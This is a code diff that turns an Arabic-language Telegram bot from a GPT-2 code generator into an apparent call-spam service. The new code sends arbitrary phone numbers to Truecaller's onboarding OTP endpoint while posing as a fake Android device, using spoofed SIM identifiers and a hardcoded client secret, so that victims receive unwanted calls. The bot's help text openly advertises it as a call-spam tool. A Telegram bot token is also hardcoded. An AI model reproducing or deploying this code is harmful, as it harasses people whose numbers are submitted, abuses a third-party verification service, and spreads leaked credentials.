@@ -1,66 +1,87 @@
+import requests
+import hashlib
+import random
 import telebot
-import os
-from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
-from transformers import GPT2LMHeadModel, GPT2Tokenizer
+from telebot.types import InlineKeyboardButton as Btn, InlineKeyboardMarkup as Mak
+import time
+from concurrent.futures import ThreadPoolExecutor
 
-# تهيئة نموذج الذكاء الاصطناعي
-tokenizer = GPT2Tokenizer.from_pretrained("gpt2")
-model = GPT2LMHeadModel.from_pretrained("gpt2")
+asa = '123456789'
+gigk = ''.join(random.choice(asa) for _ in range(10))
 
-TOKEN = "6419562305:AAHioiCY3MewQREnsxAKczTI7HJVt1MuseI"
-bot = telebot.TeleBot(TOKEN)
+md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
 
-# معالج أمر البدء
+# توكن البوت الخاص بك
+token = "6419562305:AAHioiCY3MewQREnsxAKczTI7HJVt1MuseI"
+bot = telebot.TeleBot(token)
+
+user_attempts = {}
+
+executor = ThreadPoolExecutor(max_workers=10)
+
 @bot.message_handler(commands=['start'])
-def send_welcome(message):
-    welcome_text = "👋 مرحبا بك في البوت الخاص بنا! يمكنك استخدام الأزرار أدناه للتنقل في البوت."
-    main_menu = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    main_menu.row(KeyboardButton('💡 معلومات عن البوت'), KeyboardButton('📜 التعليمات'))
-    main_menu.row(KeyboardButton('❓ المساعدة'), KeyboardButton('📂 إنشاء كود برمجي'))
-    
-    bot.send_message(message.chat.id, welcome_text, reply_markup=main_menu)
+def start(message):
+    user_id = message.from_user.id
+    name = message.from_user.first_name
+    user_attempts[user_id] = 0
+    bot.reply_to(message, f'''اهلا بك عزيزي ابو جبار ارسل الرقم مع رمز الدوله 
+لديك {2 - user_attempts[user_id]} من الفرص على كل رقم  متبقية اليوم''', reply_markup=Mak().row(
+        Btn('شرح البوت 🔀', callback_data='click'),
+        Btn('تقييم البوت', url='https://t.me/TQEEMBOT?start=0007rsflzu')
+    ))
 
-# معالج الرسائل النصية
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
-    text = message.text
-    chat_id = message.chat.id
+def call_async(number):
+    global user_attempts
+    user_id = number
+    if user_id not in user_attempts:
+        user_attempts[user_id] = 0
     
-    if text == '💡 معلومات عن البوت':
-        info_text = "هذا البوت مصمم لمساعدتك في العديد من الأمور. استخدم الأزرار أدناه للتفاعل."
-        bot.send_message(chat_id, info_text)
+    current_time = time.time()
     
-    elif text == '📜 التعليمات':
-        instructions_text = "إليك قائمة بالأوامر التي يمكنك استخدامها:\n\n/start - بدء البوت\n/help - المساعدة\n/info - معلومات عن البوت\n/generate - إنشاء كود برمجي"
-        bot.send_message(chat_id, instructions_text)
-    
-    elif text == '❓ المساعدة':
-        help_text = "إذا كنت بحاجة إلى مساعدة، لا تتردد في طرح سؤالك هنا!"
-        bot.send_message(chat_id, help_text)
-    
-    elif text == '📂 إنشاء كود برمجي':
-        bot.send_message(chat_id, "📤 الرجاء إرسال وصف للكود البرمجي الذي ترغب في إنشائه.")
-    
-    elif text == '/generate':
-        bot.send_message(chat_id, "📝 الرجاء إرسال وصفٍ للكود البرمجي الذي تود إنشائه.")
-    
+    if user_attempts[user_id] < 2:
+        user_attempts[user_id] += 1
+
+        url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"
+
+        headers = {
+            "Host": "account-asia-south1.truecaller.com",
+            "content-type": "application/json; charset=UTF-8",
+            "accept-encoding": "gzip",
+            "user-agent": "Truecaller/12.34.8 (Android; 8.1.2)",
+            "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
+        }
+
+        data = {"countryCode": "eg","dialingCode": 20,"installationDetails": {"app": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34,"store": "GOOGLE_PLAY"},"device": {"deviceId": md5,"language": "ar","manufacturer": "Xiaomi","mobileServices": ["GMS"],"model": "Redmi Note 8A Prime","osName": "Android","osVersion": "7.1.2","simSerials": ["8920022021714943876f","8920022022805258505f"]},"language": "ar","sims": [{"imsi": "602022207634386","mcc": "602","mnc": "2","operator": "vodafone"},{"imsi": "602023133590849","mcc": "602","mnc": "2","operator": "vodafone"}],"storeVersion": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34}},"phoneNumber": number,"region": "region-2","sequenceNo": 1}
+
+        req = requests.post(url, headers=headers, json=data).json()
+        if req.get('status') == 40003:
+            return '❌ رقم الهاتف غير صحيح'
+        else:
+            phonum = req.get('parsedPhoneNumber')
+            coucode = req.get('parsedCountryCode')
+            text = f'''رقم الهاتف : {phonum} ☎️
+رمز البلد  :  {coucode} 🌏
+محاولة : {2 - user_attempts[user_id]} ♨️
+النتيجة : {'تم الاتصال بل رقم المطلوب✅' if req.get('status') == 1 else 'فشل الاتصال حاول غدا  ❌'}'''
+            return text
     else:
-        response = generate_code(text)
-        send_code_as_file(chat_id, response)
+        return '❌ لقد نفذت المحاولات على هذا الرقم جرب رقم اخر '
 
-def generate_code(prompt):
-    input_ids = tokenizer.encode(prompt, return_tensors='pt')
-    output = model.generate(input_ids, max_length=100, num_return_sequences=1, no_repeat_ngram_size=2)
-    generated_text = tokenizer.decode(output[0], skip_special_tokens=True)
-    return generated_text
+@bot.message_handler(content_types=['text'])
+def num(message):
+    number = message.text
+    executor.submit(process_request, number, message)
 
-def send_code_as_file(chat_id, code):
-    filename = "generated_code.py"
-    with open(filename, 'w', encoding='utf-8') as file:
-        file.write(code)
-    with open(filename, 'rb') as file:
-        bot.send_document(chat_id, file)
-    os.remove(filename)
+def process_request(number, message):
+    spam = call_async(number)
+    bot.reply_to(message, spam)
 
-# تشغيل البوت
-bot.polling()
+@bot.callback_query_handler(func=lambda call: call.data == 'click')
+def all(call):
+    bot.send_message(call.message.chat.id, '''هذا البوت تكدر من خلاله  
+تسوي سبام اتصال مرتين على كل رقم بل يوم  مرتين ✅
+البوت شغال دائمي يطيك النتيجة بل مضبوط ذا وصل اتصال✅  وذا موصل ❌'
+المطور @XX44G
+تقييم البوت 🌝 >''')
+
+bot.infinity_polling()
